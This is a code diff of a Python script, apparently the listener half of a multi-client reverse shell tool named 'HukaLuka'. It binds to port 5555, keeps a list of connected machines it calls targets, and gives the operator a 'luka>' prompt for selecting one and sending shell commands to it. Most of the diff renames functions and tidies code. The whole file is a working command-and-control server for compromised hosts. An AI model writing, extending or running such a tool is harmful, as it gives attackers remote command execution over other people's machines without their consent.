@@ -2,150 +2,123 @@
 
 import socket
 import sys
-import os
 import threading
-import time
 from queue import Queue
+#import signal
+import code
 
-'''
-print(''
-'\n******************************************************************'
-'\n*                      __          __              __            *'
-'\n*        /\  /\       / /         / /             / /            *'
-'\n*       / /_/ /_   _ / /__ __    / /       _   _ / /__ __        *'
-'\n*      / __  / /__/ /    / - \  / /_____ / /__/ /    / - \       *'
-'\n*      \/ /_/______/__/\_\_/\_\/________/______/__/\_\_/\_\      *'
-'\n*                                                                *'
-'\n* HukaLuka Ver. 7.7                                              *'
-'\n* Coded by Aaron, Abdi and Raja                                  *'
-'\n******************************************************************\n')
-'''
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_addresses = []
 
 # write data to a log file
 def write(data):
     with open('log.txt', 'a') as f:
         f.write(data)
 
-NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
-queue = Queue()
-all_connections = []
-all_address = []
-
-# creating socket that will connect computers
-def create_socket():
+# Create socket
+def socket_create():
     try:
         global host
         global port
         global s
-        host = ""
+
+        host = '0.0.0.0' # Leave blank for own machine
         port = 5555
         s = socket.socket()
-
     except socket.error as msg:
-        print("socket creation error: " + str(msg))
+        print("Socket creation error : " + str(msg))
 
 
-# bind socket and listen for connections
-def bind_socket():
+# Bind socket to port and wait for client
+def socket_bind():
     try:
         global host
         global port
         global s
-        #print("Binding the Port: " + str(port))
+        #print("Binding socket to port : " + str(port))
         print("[*] listening as " + str(host) + ':' + str(port))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((host, port))
         s.listen(5)
-
     except socket.error as msg:
-        print("socket Binding error" + str(msg) + "\n" + "retrying...")
-        bind_socket()
+        print("Socket binding error : " + str(msg) + '\n' + "Retrying...")
+        socket_bind()
 
-# accept multiple connections
-# save them to a list
-# close previous connections upon server file restart
-def accepting_connections():
+
+# # Establish connection with client
+# def socket_accept():
+#     conn, address = s.accept()
+#     print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+#     send_commands(conn)
+#     conn.close()
+
+# Accept connections from multiple clients and save to list
+def accept_connections():
     for c in all_connections:
         c.close()
-
     del all_connections[:]
-    del all_address[:]
-
+    del all_addresses[:]
     while True:
         try:
             conn, address = s.accept()
-            s.setblocking(1)  # prevents timeout
-
+            conn.setblocking(1)
             all_connections.append(conn)
-            all_address.append(address)
-
-            print("connection has been established: " + address[0])
-            #print("Client connected "
-
+            all_addresses.append(address)
+            print("\nconnection has been established: " + address[0])
         except:
             print("error accepting connections")
 
 
+#code.interact(local=locals())
 
-
-
-
-# interactive prompt
+# Interactive promt
 def start_luka():
-    
     while True:
         cmd = input('luka> ')
         if cmd == 'list':
-            x = list_connections()
-            write(x)
-        elif 'exit' in cmd:
-            sys.exit()
+            list_connections()
         elif 'select' in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
         else:
-            print("command not recognized")
+            print("\ncommand not recognized")
 
 
-# display list of connections with client
+# Display all current connections
 def list_connections():
     results = ''
-
     for i, conn in enumerate(all_connections):
         try:
             conn.send(str.encode(' '))
             conn.recv(20480)
         except:
             del all_connections[i]
-            del all_address[i]
+            del all_addresses[i]
             continue
+        results += str(i) + '   ' + str(all_addresses[i][0]) + "    " + str(all_addresses[i][1]) + '\n'
+    print('-------clients-------' + '\n' + results)
 
-        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
 
-    print("\n-----clients-----" + "\n" + results)
-    return "\n-----clients-----" + "\n" + results
-    #print("\n-------clients-----------" + "\n" + results)
-    #return "\n-------clients-----------" + "\n" + results
-
-# select target
+# Select target client
 def get_target(cmd):
     try:
-        target = cmd.replace('select ', '')  # select [target id]
+        target = cmd.replace('select ', '')
         target = int(target)
         conn = all_connections[target]
-        print("you are now connected to: " + str(all_address[target][0]))
-        print(str(all_address[target][0]) + ">", end="")
+        print("you are now connected to: " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end='')
         return conn
-        # 192.168.0.4> ls
-
     except:
         print("selection not valid")
         return None
 
 
-# send commands to client
+# Connect with remote target client
 def send_target_commands(conn):
     while True:
         try:
@@ -157,13 +130,13 @@ def send_target_commands(conn):
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
+                print(client_response, end='')
         except:
-            print("Error sending commands")
+            print("Connection lost")
             break
 
 
-# worker threads
+# Create worker threads
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work)
@@ -171,26 +144,42 @@ def create_workers():
         t.start()
 
 
-# queue that handle connections and send commands
+# Create jobs
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+
+# Do jobs
 def work():
     while True:
         x = queue.get()
         if x == 1:
-            create_socket()
-            bind_socket()
-            accepting_connections()
+            socket_create()
+            socket_bind()
+            accept_connections()
         if x == 2:
             start_luka()
-
         queue.task_done()
 
 
-def create_jobs():
-    for x in JOB_NUMBER:
-        queue.put(x)
+# Sends commands to client
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(20480), "utf-8")
+            print(client_response, end='')
 
-    queue.join()
 
-create_workers()
-create_jobs()
-sys.exit()
+def main():
+    create_workers()
+    create_jobs()
+
+main()
